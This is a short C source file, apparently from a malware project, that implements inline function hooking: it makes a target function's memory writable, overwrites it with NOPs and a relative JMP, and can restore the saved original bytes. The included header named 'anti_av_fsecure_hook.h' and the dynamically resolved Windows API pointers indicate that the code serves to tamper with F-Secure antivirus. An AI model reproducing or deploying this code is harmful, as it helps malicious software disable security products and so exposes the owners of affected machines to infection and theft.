#include "anti_av_fsecure_hook.h"
#include "global_config.h"

#include "functions_table.h"

#include "debug.h"

BOOL restoreHook(LPHOOK_RESULT hookResult) {
	if (!hookResult) return FALSE;

	DWORD currProt;

	l_VirtualProtect(hookResult->hookFunAddr, hookResult->len, PAGE_EXECUTE_READWRITE, &currProt);

	CopyMemory(hookResult->hookFunAddr, hookResult->originalData, hookResult->len);

	DWORD dummy;

	l_VirtualProtect(hookResult->hookFunAddr, hookResult->len, currProt, &dummy);

	l_HeapFree(l_GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS, hookResult->originalData);
	l_HeapFree(l_GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS, hookResult);

	return TRUE;
}

LPHOOK_RESULT installHook(LPVOID hookFunAddr, LPVOID jmpAddr, SIZE_T len) {
	if (len < 5) {
		DBG_MSG("installHook() - len < 5, so return NULL now.\n");
		return NULL;
	}

	DBG_MSG("installHook() - hookFunAddr address: 0x%p\n", (SIZE_T)hookFunAddr);
	DBG_MSG("installHook() - jmpAddr address: 0x%p\n", (SIZE_T)jmpAddr);

	DWORD currProt;


	LPBYTE originalData = (LPBYTE)l_HeapAlloc(l_GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS, len);
	CopyMemory(originalData, hookFunAddr, len);

	LPHOOK_RESULT hookResult = (LPHOOK_RESULT)l_HeapAlloc(l_GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS, sizeof(HOOK_RESULT));

	hookResult->hookFunAddr = hookFunAddr;
	hookResult->jmpAddr = jmpAddr;
	hookResult->len = len;

	hookResult->originalData = originalData;

	l_VirtualProtect(hookFunAddr, len, PAGE_EXECUTE_READWRITE, &currProt);

	memset(hookFunAddr, 0x90, len);

	SIZE_T relativeAddress = ((SIZE_T)jmpAddr - (SIZE_T)hookFunAddr) - 5;

	*(LPBYTE)hookFunAddr = 0xE9; // JMP OP CODE
	*(PSIZE_T)((SIZE_T)hookFunAddr + 1) = relativeAddress;

	DWORD temp;
	l_VirtualProtect(hookFunAddr, len, currProt, &temp);

	DBG_MSG("installHook() - Hook installed at address: 0x%p\n", (SIZE_T)hookFunAddr);

	return hookResult;
}